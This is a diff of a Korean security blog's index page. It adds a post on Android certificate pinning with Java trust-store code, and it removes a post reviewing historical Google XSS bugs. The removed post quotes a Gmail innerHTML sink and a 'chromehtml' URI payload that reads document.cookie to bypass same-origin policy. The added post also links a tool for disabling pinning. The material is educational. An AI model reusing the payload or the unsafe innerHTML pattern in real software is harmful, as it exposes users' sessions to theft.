@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="The mechanism behind Internet Explorer CVE-2014-1776 exploits Matt Oh 의 CVE-2014-1776 분석. Flash 가 heap spraying 을 수행하고, JavaScript function 을 호출한다. &hellip;">
+  <meta name="description" content="BlackHat 2012 에서 발표된 Certificate Pinning 에 관련된 발표. private InputStream makeRequest(Context context, URL url) { // Load custom Trust Store from a file &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,89 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/21/certificate-pinning-on-android/">Certificate Pinning on Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-21T13:03:01+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>1:03 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://media.blackhat.com/bh-us-12/Turbo/Diquet/BH_US_12_Diqut_Osborne_Mobile_Certificate_Pinning_Slides.pdf">BlackHat 2012 에서 발표된 Certificate Pinning 에 관련된 발표</a>.</p>
+
+<pre><code>private InputStream makeRequest(Context context, URL url) {
+    // Load custom Trust Store from a file
+    AssetManager assetManager = context.getAssets();
+    InputStream keyStoreInputStream = assetManager.open("yourapp.store");
+    KeyStore trustStore = KeyStore.getInstance("BKS");
+    trustStore.load(keyStoreInputStream, "somepass".toCharArray());
+
+    TrustManagerFactory tmf = TrustManagerFactory.getInstance("X509");
+    tmf.init(trustStore);
+
+    // Init an sslContext with the custom Trust Store
+    SSLContext sslContext = SSLContext.getInstance("TLS");
+    sslContext.init(null, tmf.getTrustManagers(), null);
+
+    // Use this sslContext for subsequent HTTPS connections
+    HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();
+    urlConnection.setSSLSocketFactory(sslContext.getSocketFactory());
+
+    return urlConnection.getInputStream();
+}
+</code></pre>
+
+<p>서버의 certificate 을 확인.</p>
+
+<pre><code>openssl s_client -connect www.babo.com:443 -tlsextdebug
+</code></pre>
+
+<p>그럼 왜 Certificate Pinning 을 하는가. PKI 의 신뢰 체인이 한계에 다달았기 때문.</p>
+
+<p>간단하게</p>
+
+<ul>
+<li>Root CA 가 너무 많다.</li>
+<li>Root CA 를 믿을 수 없다.</li>
+</ul>
+
+
+<p>Browser 같이 불특정 다수의 웹 사이트를 상대해야 하는 경우라면 어쩔 수 없지만,
+모바일 전용 앱과 같은 경우 한두개의 서버만 상대하면 되기때문에, Certificate Pinning 을 사용하는 것이 더 안전하다.</p>
+
+<ul>
+<li><a href="http://nelenkov.blogspot.kr/2012/12/certificate-pinning-in-android-42.html">Certificate pinning in Android 4.2</a></li>
+<li><a href="https://www.imperialviolet.org/2011/05/04/pinning.html">Public key pinning (04 May 2011)</a></li>
+<li><a href="http://h30499.www3.hp.com/t5/Fortify-Application-Security/Certificate-Pinning-for-Mobile-Applications/ba-p/6223897#.U6OGK5S1bOM">Certificate Pinning for Mobile Applications</a></li>
+</ul>
+
+
+<p>Certificate Pinning 이 적용된 App 은 리버싱하기가 불편하기 때문에, disable 시키는 kill-switch patch 를 적용한다.</p>
+
+<ul>
+<li><a href="https://github.com/iSECPartners/ios-ssl-kill-switch">github.com/iSECPartners/ios-ssl-kill-switch</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -897,81 +980,6 @@ AID_INET
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/04/23/gmail-xss-2012/">Gmail XSS - 2012</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-04-23T09:29:16+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>9:29 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Google 프로덕트에서 발견된 대표적인 XSS 취약점들을 리뷰해본다.</p>
-
-<h3><a href="http://www.benhayak.com/2012/06/google-mail-hacking-gmail-stored-xss.html">Google Mail Hacking - Gmail Stored XSS - 2012!</a></h3>
-
-<pre><code>// This Gmail Code was creating a Tool-tip that included 
-// profile circles information that comes from 
-// your Google Plus friend's account, 
-// if they used a payload, 
-// your mail account would have been at a serious risk.
-
-zk.prototype.Ca = function $pn(a,c,d) {
-    this.xa = 0;
-    if (!this.ea) {
-        // ...
-        var e = this.Bb.zb().body, g = this.ea.va();
-        // ...
-        e.wa = h
-    }
-    a: {
-        if (d)
-            switch (d.toLowerCase().split(",")[1]) {
-                case "l":
-                    break a;
-                case "r":
-                    // ...
-                    break a
-            }
-        e = 2;
-    }
-    this.wa.setPosition(cka(d),e,i,-1);
-    jc(this.ea.va(), "T-ays-avH");
-    ud(this.ea.va(), 0, 0);
-    this.ea.Mc().innerHTML = c; // c = Data from Google+
-    this.wa.To(a);
-    this.wa.Me(k, 0);
-};
-</code></pre>
-
-<p>정리하면 위 코드는 Google+ 친구의 프로파일 정보를 Tool-tip 의 innerHTML 에 장착한다. 결국 친구 프로파일을 보여주는 Tool-tip 이 뜨는 순간, 내 브라우저에 payload 가 실행될 수 있다는 것.</p>
-
-<h3><a href="http://blog.watchfire.com/files/google-chrome-advisory.doc">&ldquo;CHROMEHTML&rdquo; URI Vulnerability</a></h3>
-
-<pre><code>var sneaky = 'setTimeout("alert(document.cookie);", 4000);document.location.assign("http://www.gmail.com");';
-document.location = 'chromehtml:"80%20javascript:document.write(sneaky)"';
-</code></pre>
-
-<p>chromehtml: uri handler 를 통해서 javascript 을 수행시키고, setTimeout() 을 통해 SOP 를 바이패스한다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/15">&larr; Older</a>
@@ -989,6 +997,10 @@ document.location = 'chromehtml:"80%20javascript:document.write(sneaky)"';
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2015/12/07/trustnone/">TRUSTNONE</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
       </li>
     
@@ -1002,10 +1014,6 @@ document.location = 'chromehtml:"80%20javascript:document.write(sneaky)"';
     
       <li class="post">
         <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
       </li>
     
   </ul>
